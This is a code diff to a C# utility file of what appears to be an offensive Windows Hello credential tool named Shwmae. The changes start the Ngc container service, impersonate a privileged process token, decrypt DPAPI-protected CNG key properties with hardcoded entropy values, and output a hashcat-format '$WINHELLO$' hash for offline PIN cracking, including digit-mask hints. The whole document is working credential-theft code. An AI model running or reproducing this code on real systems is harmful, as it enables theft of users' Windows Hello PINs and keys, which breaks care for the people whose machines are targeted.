@@ -4,8 +4,11 @@ using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Security.Principal;
 using System.Text;
+using DPAPI;
 using NtApiDotNet;
+using NtApiDotNet.Win32;
 
 namespace Shwmae {
     public static class Utils {
@@ -124,6 +127,11 @@ namespace Shwmae {
                             .Where(t => t != null)
                             .First();
                     } else if (user == "Ngc") {
+
+                        if(ServiceUtils.GetService("NgcCtnrSvc").Status == ServiceStatus.Stopped) {
+                            ServiceUtils.StartService("NgcCtnrSvc", new string[] { });
+                        }
+
                         result = NtProcess.GetProcesses(ProcessAccessRights.AllAccess)
                             .Select(p => p.OpenToken())
                             .Where(t => t.User.Sid == KnownSids.LocalService && t.Groups.Any(g => g.Name == "NT SERVICE\\NgcCtnrSvc"))
@@ -153,17 +161,77 @@ namespace Shwmae {
             Assembly.Load("JWT");
             Assembly.Load("System.Text.Json");
             Assembly.Load("System.Memory");
-            Assembly.Load("Microsoft.Bcl.AsyncInterfaces");
+            //Assembly.Load("Microsoft.Bcl.AsyncInterfaces");
             Assembly.Load("System.Threading.Tasks.Extensions");
             Assembly.Load("System.Text.Encodings.Web");
             Assembly.Load("System.Buffers");
             Assembly.Load("System.Collections.Immutable");
             Assembly.Load("Dahomey.Cbor");
             Assembly.Load("Newtonsoft.Json");
+            Assembly.Load("NLog");
 
             impersonateToken = GetSystem(impersonate);
             var impersonationContext = impersonateToken.Impersonate();
             return impersonationContext;
+        }
+        public static string GetWinHelloHash(CNGKey cngKey, IMasterKeyProvider masterKeyProvider) {
+
+            var masterKey = masterKeyProvider.GetMasterKey(cngKey.KeyBlob.PrivateKey.GuidMasterKey);
+            byte[] dpapiKey = null;
+
+            if(masterKey == null) {
+                throw new CryptographicException($"Master key with ID {cngKey.KeyBlob.PrivateKey.GuidMasterKey} not found");
+            }
+
+            masterKey.Decrypt(dpapiKey);
+         
+            var privatePropertiesBlob = cngKey.KeyBlob.PrivateProperties.Decrypt(masterKey.Key,
+                                                         Encoding.UTF8.GetBytes("6jnkd5J3ZdQDtrsu\0"));
+
+            byte[] entropy = Encoding.UTF8.GetBytes("xT5rZW5qVVbrvpuA\0");
+
+            if (privatePropertiesBlob.Length > 0) {
+                var privateProperties = CNGProperty.Parse(new BinaryReader(new MemoryStream(privatePropertiesBlob)), (uint)privatePropertiesBlob.Length);
+                var uiPolicy = privateProperties.FirstOrDefault(p => p.Name == "UI Policy");
+
+                if (!uiPolicy.Equals(default)) {
+                    var flags = BitConverter.ToInt32(uiPolicy.Value, 4);
+
+                    if ((flags & 0x3) >= 1) {
+
+                        var saltProp = privateProperties.FirstOrDefault(p => p.Name == "NgcSoftwareKeyPbkdf2Salt");
+                        var roundsProp = privateProperties.FirstOrDefault(p => p.Name == "NgcSoftwareKeyPbkdf2Round");
+
+                        if (default(CNGProperty).Equals(saltProp) || default(CNGProperty).Equals(roundsProp)) {
+
+                           // if (pin == null) {
+                           //     Console.WriteLine("[!] Key is protected with PIN/Password, specify with --pin argument");
+                           // } else {
+                           //     entropy = entropy.Concat(SHA512.Create().ComputeHash(new MemoryStream(Encoding.Unicode.GetBytes(pin)))).ToArray();
+                            //}
+
+                        } else {
+
+                            var rounds = BitConverter.ToInt32(roundsProp.Value, 0);
+                            //if (pin == null) {
+                            string hashcatHash = $"$WINHELLO$*{(AlgId)cngKey.KeyBlob.PrivateKey.HashAlgo}*{rounds}*{saltProp.Value.Hex()}*{cngKey.KeyBlob.PrivateKey.Signature.Hex()}*{masterKey.Key.Hex()}*{cngKey.KeyBlob.PrivateKey.HMAC.Hex()}*{cngKey.KeyBlob.PrivateKey.Blob.Hex()}*{entropy.Hex()}";
+                            if (cngKey.PinLength == 0)
+                                Console.WriteLine("[!] Key is protected with a complex PIN, specify with --pin argument or you can crack with hashcat hash below");
+                            else
+                                Console.WriteLine($"[!] Key is protected with a {cngKey.PinLength} digit PIN, specify with --pin argument or you can crack with hashcat hash below with the mask {"?d".Repeat(cngKey.PinLength)}");
+
+                            return hashcatHash;
+
+                            //} else {
+                            //    entropy = entropy.Concat(SharpDPAPI.Crypto.PinToEntropy(pin, rounds, saltProp.Value)).ToArray();
+                            //}
+                        }
+                    };
+                }
+            }
+
+            return null;
+
         }
     }
 }
